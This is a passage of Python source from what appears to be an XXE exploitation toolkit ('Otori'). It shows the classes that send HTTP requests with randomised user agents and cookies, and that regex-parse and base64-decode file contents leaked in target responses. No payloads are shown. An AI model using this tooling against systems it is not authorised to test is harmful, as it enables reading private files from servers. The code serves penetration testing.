		rx = re.compile(rexString, flags=re.DOTALL)
		completeresult = XXEResponse()
		completeresult.NetworkLevelResponse = response.NetworkLevelResponse
		completeresult.XXETarget = xxeTarget
		completeresult.ResponseBody = responseBody
		
		matches = rx.findall(responseBody)
		if matches:
			#result = matches[0][1]
			result = matches[0]
			completeresult.ParsedResponse = result
			completeresult.ReturnCode = resultCode
			self.OtoriInstance.MultiLogger.debug('Found result:\n' + result)
			if (base64DecodeBody):
				try:
					bdecoded = base64.b64decode(completeresult.ParsedResponse)
					self.LogDebug('Base64-decoded response body: "{0}"'.format(bdecoded))
					completeresult.ParsedResponse = bdecoded
				except Exception as e:
					self.LogError('Could not base64-decode the response body "{0}"'.format(completeresult.ParsedResponse))
		else:
			self.OtoriInstance.MultiLogger.debug('No XXE content found in response')
			completeresult = self.ParseErrorResponse(xxeTarget, response, responseParserRegexStrings, completeresult)
		
		self.OtoriInstance.MultiLogger.debug('Final response return code: ' + str(completeresult.ReturnCode))
		self.OtoriInstance.MultiLogger.debug('Final parsed response body: ' + str(completeresult.ParsedResponse))
		
		return completeresult
		
	def UnescapeBackslashResponse(self, response):
		response.ParsedResponse = response.ParsedResponse.replace('\\n', '\n')
		response.ParsedResponse = response.ParsedResponse.replace('\\t', '\t')
		for charNum in range(0, 127):
			hexCode = '\\u00{:02X}'.format(charNum)
			hcLower = hexCode.lower()
			decodedChar = str(unichr(charNum))
			response.ParsedResponse = response.ParsedResponse.replace(hcLower, decodedChar)
			hcUpper = hexCode.lower()
			response.ParsedResponse = response.ParsedResponse.replace(hcUpper, decodedChar)
		return response
		
	def LogDebug(self, message):
		if self.MultiLogger:
			self.MultiLogger.debug(message)

	def LogInfo(self, message):
		if self.MultiLogger:
			self.MultiLogger.info(message)

	def LogWarning(self, message):
		if self.MultiLogger:
			self.MultiLogger.warning(message)

	def LogError(self, message, isFatal = False):
		if self.MultiLogger:
			self.MultiLogger.error(message)
		if (isFatal):
			raise XXEModuleError(message)

	def LogCritical(self, message, isFatal = False):
		if self.MultiLogger:
			self.MultiLogger.critical(message)
		if (isFatal):
			raise XXEModuleError(message)

# parent class for all HTTP/HTTPS-based modules
# is not actually instantiated on its own
# note: currently the only type of XXE module
class XXEHTTP(XXEExploitModule):
	def __init__(self, uid, name):
		XXEExploitModule.__init__(self, uid, name)
		self.DeceitfulHTTPClient = libdeceitfulhttp.DeceitfulHTTPClient()
		self.UserAgentGenerator = libdeceitfulhttp.RandomUserAgentGenerator()
		self.FixedUserAgent = None
		self.CookieString = None

	def SetParentOtoriInstance(self, otoriInstance):
		XXEExploitModule.SetParentOtoriInstance(self, otoriInstance)
		self.DeceitfulHTTPClient.MultiLogger = otoriInstance.MultiLogger
		self.DeceitfulHTTPClient.RequestTimeout = otoriInstance.RequestTimeout

	def SendRequest(self, httpMethod, targetURL, requestBody, requestHeaders):
		req = self.DeceitfulHTTPClient.BuildRequest(httpMethod, targetURL, requestHeaders, requestBody)
		if (self.CookieString):
			if (self.CookieString.strip() != ''):
				req.AddOrReplaceHeader('Cookie', self.CookieString)
		result = self.DeceitfulHTTPClient.SendRequest(req)
		return result

	# this really needs to be reworked and put into libdeceitfulhttp
	def GetUserAgent(self):
		if (self.FixedUserAgent):
			return self.FixedUserAgent
		return self.UserAgentGenerator.GenerateUserAgent()

	# this really needs to be reworked and put into libdeceitfulhttp
	def GetStandardHTTPHeaders(self):
		result = {}
		ua = self.GetUserAgent()
		if (ua.strip() != ''):
			result['User-Agent'] = self.GetUserAgent()
		result['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0'
		result['Pragma'] = 'no-cache'
		result['Connection'] = 'close'
		if (self.CookieString):
			result['Cookie'] = self.CookieString
		return result
		
	def GetRedirectLocationFrom30X(self, httpResponse):
		# This is a hack until I fully replace the built-in Python httplib request/response model
		# headers that come back from it are converted to all-lowercase
		# because ignoring standards is awesome
		foundLocationHeader = False
		redirectURL = httpResponse.GetHeaderByName('Location')
		if (redirectURL):
			foundLocationHeader = True
		else:
			redirectURL = httpResponse.GetHeaderByName('location')
			if (redirectURL):
				foundLocationHeader = True
		
		if not (foundLocationHeader):
			errMsg = 'The HTTP response did not contain a Location header'
			self.LogError(errMsg, isFatal = True)
		
		self.LogDebug('Got redirect URL "{0}" from the HTTP response'.format(redirectURL))
		return redirectURL
		
	#def GetNamedParameterFromURL(self, url, parameterName):
		#parameterValue = None
		#urlComponents = libdeceitful.URLComponents.FromURL(url, multiLogger = self.MultiLogger)
		#urlParameters = 
		#rx = re.compile('()', flags=re.IGNORECASE)
		#m = rx.match(remainder)
		##print 'm: "' + str(m) + '"'
		#if (m):
			#result.HTTPVersion = m.group('version')
		#else:
			##print 'Could not find HTTP version'
			#result.HTTPVersion = ''
		
		#self.LogDebug('Got value "{0}" for parameter "{1}" from the URL "{2}"'.format(, parameterName, url))
		#return parameterValue